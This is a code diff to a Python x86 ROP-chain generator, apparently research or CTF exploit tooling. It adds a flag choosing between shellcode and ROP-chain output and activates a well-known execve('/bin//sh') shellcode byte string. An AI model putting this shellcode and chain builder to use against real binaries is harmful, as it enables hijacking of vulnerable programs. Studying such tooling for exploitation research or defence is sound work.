@@ -15,10 +15,11 @@ from collections import defaultdict
 
 
 class ROPMakerX86(object):
-    def __init__(self, binary, gadgets, padding, execve, liboffset=0x0):
+    def __init__(self, binary, gadgets, padding, execve, is_shellCode, liboffset=0x0):
         self.__binary  = binary
         self.__gadgets = gadgets #+ [{"vaddr" : 0xEEFFEEDD, "gadget" : "pop ebx ; ret"}, {"vaddr" : 0xAABBBBCC, "gadget" : "pop esi ; ret"}, {"vaddr" : 0xAACCDDCC, "gadget" : "sub ebx, esi ; ret"}]
 
+        self.__FILE_NAME = "ropchain"
         #self.__gadgets = self.__gadgets #+ [{"vaddr" : 0x423A35C7, "gadget" : "dec ebx; ret"}, {"vaddr" : 0xEEFFEEDD, "gadget" : "pop ebx ; ret"}, {"vaddr" : 0xAABBBBCC, "gadget" : "pop esi ; ret"}]
 
         #print("BIG SEX", self.__gadgets)
@@ -28,6 +29,7 @@ class ROPMakerX86(object):
 
         self.__execve = execve          ### MODIFIED
         self.__WORD_SIZE = 4            ### MODIFIED
+        self.__is_shellCode = is_shellCode
 
         self.possibledoubles = {}
         self.possiblemasks = {}
@@ -522,7 +524,7 @@ class ROPMakerX86(object):
 
         #runs systemcall
 
-        outputfile = open("paddingbruteforce", "wb")
+        outputfile = open(self.__FILE_NAME, "wb")
         outputfile.write(p)
         outputfile.close()
 
@@ -560,8 +562,8 @@ class ROPMakerX86(object):
         # 53 89 e1 99
         # b0 0b cd 80
 
-        #shellCode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
-        shellCode = b'\x68\x50\xc0\x31\x68\x73\x2f\x2f\x69\x62\x2f\x68\x50\xe3\x89\x6e\x99\xe1\x89\x53\x80\xcd\x0b\xb0'
+        shellCode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
+        #shellCode = b'\x68\x50\xc0\x31\x68\x73\x2f\x2f\x69\x62\x2f\x68\x50\xe3\x89\x6e\x99\xe1\x89\x53\x80\xcd\x0b\xb0'
         len_shellCode = 4096#32#len(shellCode)#*2 + 0x00000FFF
 
         
@@ -627,7 +629,7 @@ class ROPMakerX86(object):
         print("Start of .data: {0:8X}. Start of .bss: {2:8X}. Start of shellcode on the stack: {1:8X}".format(start_of_page, dataAddr, bss))
 
 
-        file = open("shellcode_ROP", "wb")
+        file = open(self.__FILE_NAME, "wb")
         file.write(p)
         file.close()
     
@@ -1015,8 +1017,14 @@ class ROPMakerX86(object):
 
         #self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
         #self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
-        self.arbitrary_shell_code(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, MaskEbx, popEcx, MaskEcx, popEdx, MaskEdx, syscall, listchainmask)
+        #self.arbitrary_shell_code(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, MaskEbx, popEcx, MaskEcx, popEdx, MaskEdx, syscall, listchainmask)
         #self.testingmasking(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx,MaskEbx, popEcx,MaskEcx, popEdx, MaskEdx, syscall, listchainmask)
 
         #print(self.GenerateMaskRopChain(0xFFFFFF00, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, chainmask, isaddr=True))
-    
+        
+
+        # Selects if we are generating shellcode or a ROPchain
+        if (self.__is_shellCode):
+            self.arbitrary_shell_code(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, MaskEbx, popEcx, MaskEcx, popEdx, MaskEdx, syscall, listchainmask)
+        else:
+            self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
